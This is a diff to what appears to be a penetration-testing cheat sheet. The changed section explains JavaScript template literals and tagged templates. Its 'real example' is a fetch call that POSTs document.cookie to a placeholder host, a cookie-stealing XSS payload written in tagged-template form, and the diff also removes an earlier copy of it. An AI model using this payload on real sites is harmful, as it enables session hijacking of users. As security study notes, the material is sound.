@@ -555,13 +555,38 @@ hashcat -a 0 -m 16500 <jwt> <wordlist>
 #### SQLi
 - 
 #### Javascript
-- Accessing object `obj = {p:'A'}`
+##### Accessing object `obj = {p:'A'}`
   - `obj.p     // 'A'`
   - `obj['p']  // 'A'`
   - `const { p } = object; p // 'A'`
-- Function calls `function f(a, b){console.log(a + b}`
-  - f('a','b')
-  - `f\arg1${arg2}arg1${arg2}\` // fetch`https://example.org/data${{mode:'no-cors', method:'POST', body: document.cookie}})
+
+##### [Template literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)
+Template literals are literals delimited with backtick (`) characters, allowing for multi-line strings, string interpolation with embedded expressions, and special constructs called tagged templates. The expression can contain any Javascript expression, including objects.
+For example :
+```
+const a = 5;
+const b = 10;
+console.log("Fifteen is " + (a + b) + " and\nnot " + (2 * a + b) + ".");
+```
+
+##### Functions
+###### [Tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates)
+Tags allow you to parse template literals with a function. The first argument of a tag function contains an array of string values. The remaining arguments are related to the expressions.
+For [example](https://codeburst.io/javascript-template-literals-tag-functions-for-beginners-758a041160e1): 
+```
+// TAG FUNCTION
+greet`I'm ${name}. I'm ${age} years old.`
+// EQUIVALENT FUNCTION
+greet(["I'm ", ". I'm ", " years old."], name, age)
+```
+
+Another real example:
+```
+// TAG FUNCTION
+fetch`https://example.org/data${{mode:'no-cors', method:'POST', body: document.cookie}}`
+// EQUIVALENT FUNCTION
+fetch('https://example.org/data',{mode:'no-cors', method:'POST', body: session=zpz557zefs489zfd5f4})
+```
 
 ### :white_check_mark: Work with hash
 #### Identify hash
